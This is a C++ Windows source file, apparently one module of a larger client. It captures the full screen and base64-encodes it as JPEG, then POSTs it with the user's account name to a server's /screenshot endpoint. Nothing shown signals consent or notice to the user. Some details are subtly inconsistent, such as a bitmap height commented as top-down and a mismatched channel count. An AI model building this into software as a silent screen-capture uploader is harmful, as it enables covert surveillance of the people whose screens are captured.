/*
* Noted: Unused code.
Handle screen capture functionality
*/
#include "ScreenProcess.hpp"
#include <wininet.h>
#include "../GetDevice/Hardware.hpp"
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
#include <algorithm>

#include <wincodec.h>
#pragma comment(lib, "windowscodecs.lib")

void write_func(void* context, void* data, int size) {
    std::vector<BYTE>* outBuffer = static_cast<std::vector<BYTE>*>(context);
    const BYTE* byteData = static_cast<const BYTE*>(data);
    outBuffer->insert(outBuffer->end(), byteData, byteData + size);
}

std::vector<BYTE> ScreenProcess::convertBitmapToJPEG(const std::vector<BYTE>& bitmapData,
    int width, int height, int quality) {
    std::vector<BYTE> jpegData;
    stbi_write_jpg_to_func(write_func, &jpegData, width, height, 3,
        bitmapData.data(), quality);
    return jpegData;
}

bool ScreenProcess::captureScreen() {
    try {
        CoInitialize(NULL);

        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);

        SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

        IWICImagingFactory* factory = NULL;
        IWICBitmapEncoder* encoder = NULL;
        IWICBitmapFrameEncode* frame = NULL;
        IStream* stream = NULL;

        CoCreateInstance(CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
            IID_PPV_ARGS(&factory));

        CreateStreamOnHGlobal(NULL, TRUE, &stream);
        factory->CreateEncoder(GUID_ContainerFormatJpeg, NULL, &encoder);
        encoder->Initialize(stream, WICBitmapEncoderNoCache);
        encoder->CreateNewFrame(&frame, NULL);
        frame->Initialize(NULL);

        frame->SetSize(width, height);

        BYTE* bits;
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = width;
        bmi.bmiHeader.biHeight = -height;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;

        GetDIBits(hdcScreen, hBitmap, 0, height, NULL, &bmi, DIB_RGB_COLORS);
        bits = new BYTE[bmi.bmiHeader.biSizeImage];
        GetDIBits(hdcScreen, hBitmap, 0, height, bits, &bmi, DIB_RGB_COLORS);

        frame->WritePixels(height, width * 3, bmi.bmiHeader.biSizeImage, bits);
        frame->Commit();
        encoder->Commit();

        STATSTG stats;
        stream->Stat(&stats, STATFLAG_NONAME);
        std::vector<BYTE> buffer(stats.cbSize.LowPart);

        LARGE_INTEGER li = { 0 };
        stream->Seek(li, STREAM_SEEK_SET, NULL);
        stream->Read(buffer.data(), stats.cbSize.LowPart, NULL);

        // Cleanup
        delete[] bits;
        stream->Release();
        frame->Release();
        encoder->Release();
        factory->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        CoUninitialize();

        std::string base64 = convertToBase64(buffer);
        return sendScreenshotToServer(base64, width, height);
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(e.what());
        CoUninitialize();
        return false;
    }
}

std::vector<BYTE> ScreenProcess::captureScreenToMemory() {
    try {
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);

        HDC hdcScreen = GetDC(NULL);
        HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMemDC, hBitmap);

        if (!BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight,
            hdcScreen, 0, 0, SRCCOPY)) {
            throw std::runtime_error("BitBlt failed");
        }

        BITMAPINFOHEADER bi = { 0 };
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = screenWidth;
        bi.biHeight = screenHeight; // Top-down DIB
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;

        int stride = ((screenWidth * bi.biBitCount + 31) / 32) * 4;
        std::vector<BYTE> buffer(stride * screenHeight);

        if (!GetDIBits(hdcScreen, hBitmap, 0, screenHeight,
            buffer.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
            throw std::runtime_error("GetDIBits failed");
        }

        SelectObject(hdcMemDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMemDC);
        ReleaseDC(NULL, hdcScreen);

        return buffer;
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(e.what());
        return std::vector<BYTE>();
    }
}

std::vector<BYTE> ScreenProcess::convertBitmapToPNG(const std::vector<BYTE>& bitmapData, int width, int height) {
    std::vector<BYTE> pngData;
    stbi_write_png_to_func([](void* context, void* data, int size) {
        std::vector<BYTE>* pngData = static_cast<std::vector<BYTE>*>(context);
        const BYTE* byteData = static_cast<const BYTE*>(data);
        pngData->insert(pngData->end(), byteData, byteData + size);
        }, &pngData, width, height, 4, bitmapData.data(), width * 4);
    return pngData;
}

std::string ScreenProcess::convertToBase64(const std::vector<BYTE>& data) {
    const std::string base64Chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    std::string result;
    int i = 0;
    int j = 0;
    unsigned char array3[3];
    unsigned char array4[4];

    for (BYTE byte : data) {
        array3[i++] = byte;
        if (i == 3) {
            array4[0] = (array3[0] & 0xfc) >> 2;
            array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
            array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
            array4[3] = array3[2] & 0x3f;

            for (i = 0; i < 4; i++)
                result += base64Chars[array4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            array3[j] = '\0';

        array4[0] = (array3[0] & 0xfc) >> 2;
        array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
        array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++)
            result += base64Chars[array4[j]];

        while (i++ < 3)
            result += '=';
    }

    return result;
}

bool ScreenProcess::sendScreenshotToServer(const std::string& base64Data, int width, int height) {
    try {
        Logger::getInstance()->info("Preparing to send screenshot to server...");
        Logger::getInstance()->info("Base64 size: " + std::to_string(base64Data.length()));

        nlohmann::json payload = {
            {"username", Hardware::GetUsername()},
            {"image", base64Data},
            {"width", width},
            {"height", height}
        };

        HINTERNET hInternet = InternetOpenA("Screenshot Client",
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            Logger::getInstance()->expection("Failed to open internet connection");
            return false;
        }

        // Debug log
        Logger::getInstance()->info("Connecting to: http://localhost:3000/");

        HINTERNET hConnect = InternetConnectA(hInternet, SERVER_HOST, // http://localhost:3000/
            80,  // HTTP port
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            Logger::getInstance()->expection("Failed to connect to server");
            return false;
        }

        // Debug log
        Logger::getInstance()->info("Opening request to /screenshot");

        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/screenshot",
            NULL, NULL, NULL, 0, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            Logger::getInstance()->expection("Failed to create request");
            return false;
        }

        std::string jsonStr = payload.dump();
        std::string headers = "Content-Type: application/json\r\n";

        // Debug log
        Logger::getInstance()->info("Sending data, size: " + std::to_string(jsonStr.length()));

        if (!HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
            (LPVOID)jsonStr.c_str(), jsonStr.length())) {
            DWORD error = GetLastError();
            Logger::getInstance()->expection("Failed to send request. Error code: " + std::to_string(error));
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }

        Logger::getInstance()->info("Screenshot sent successfully");

        // Check response
        char buffer[1024];
        DWORD bytesRead;
        std::string response;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            response.append(buffer, bytesRead);
        }
        Logger::getInstance()->info("Server response: " + response);

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        return true;
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error sending screenshot: ") + e.what());
        return false;
    }
}